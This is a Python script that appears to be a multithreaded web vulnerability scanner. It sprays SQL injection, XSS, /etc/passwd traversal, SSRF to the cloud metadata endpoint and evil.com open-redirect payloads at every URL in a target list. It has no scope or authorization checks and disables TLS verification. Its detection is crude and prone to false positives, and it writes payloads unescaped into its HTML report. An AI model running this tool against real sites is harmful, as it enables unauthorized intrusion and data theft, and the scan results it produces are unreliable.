import requests
import argparse
import concurrent.futures
import csv
from bs4 import BeautifulSoup
import json

# ---------- Payload Pools ----------
payloads = {
    "SQLi": ["' OR '1'='1", "' UNION SELECT NULL--", "\" OR \"1\"=\"1"],
    "XSS": ["<script>alert(1)</script>", "\"><img src=x onerror=alert(1)>"],
    "LFI": ["../../../../etc/passwd", "..%2f..%2f..%2f..%2fetc/passwd"],
    "SSRF": ["http://127.0.0.1:80", "http://169.254.169.254/latest/meta-data/"],
    "OpenRedirect": ["//evil.com", "/\\evil.com"],
}

signatures = ["root:", "alert(1)", "syntax error", "mysql", "oracle", "sql server", "forbidden"]

# ---------- Core Tester ----------
def test_request(url, method="GET", data=None, json_data=None):
    try:
        if method == "GET":
            r = requests.get(url, timeout=5, verify=False)
        elif method == "POST":
            r = requests.post(url, data=data, timeout=5, verify=False)
        elif method == "JSON":
            r = requests.post(url, json=json_data, timeout=5, verify=False)
        else:
            return None
        return r.text
    except:
        return None

# ---------- Vulnerability Scanner ----------
def scan_url(url):
    vulns_found = []
    try:
        # --- GET ---
        for category, tests in payloads.items():
            for p in tests:
                test_url = f"{url}?q={p}"
                resp = test_request(test_url)
                if resp and any(sig in resp.lower() for sig in signatures):
                    vulns_found.append((category, "GET", test_url))

        # --- POST (form fields) ---
        for category, tests in payloads.items():
            for p in tests:
                resp = test_request(url, method="POST", data={"q": p})
                if resp and any(sig in resp.lower() for sig in signatures):
                    vulns_found.append((category, "POST", f"q={p}"))

        # --- JSON (API endpoints) ---
        for category, tests in payloads.items():
            for p in tests:
                resp = test_request(url, method="JSON", json_data={"q": p})
                if resp and any(sig in resp.lower() for sig in signatures):
                    vulns_found.append((category, "JSON", f'{{"q":"{p}"}}'))

    except Exception as e:
        pass

    return url, vulns_found

# ---------- Runner ----------
def main(target_file, out_csv, out_html):
    with open(target_file) as f:
        urls = [u.strip() for u in f if u.strip()]

    with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
        results = list(executor.map(scan_url, urls))

    # Save CSV
    with open(out_csv, "w", newline="", encoding="utf-8") as f:
        writer = csv.writer(f)
        writer.writerow(["URL", "Method", "Vulnerability", "Payload"])
        for url, vulns in results:
            for v in vulns:
                writer.writerow([url, v[1], v[0], v[2]])

    # Save HTML
    with open(out_html, "w", encoding="utf-8") as f:
        f.write("<html><body><h2>Scan Report</h2><table border=1>")
        f.write("<tr><th>URL</th><th>Method</th><th>Vulnerability</th><th>Payload</th></tr>")
        for url, vulns in results:
            for v in vulns:
                f.write(f"<tr><td>{url}</td><td>{v[1]}</td><td>{v[0]}</td><td>{v[2]}</td></tr>")
        f.write("</table></body></html>")

    print(f"[+] Scan complete. Results saved in {out_csv} and {out_html}")

# ---------- CLI ----------
if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("target_file", help="File containing list of URLs")
    parser.add_argument("--csv", default="results.csv")
    parser.add_argument("--html", default="results.html")
    args = parser.parse_args()
    main(args.target_file, args.csv, args.html)
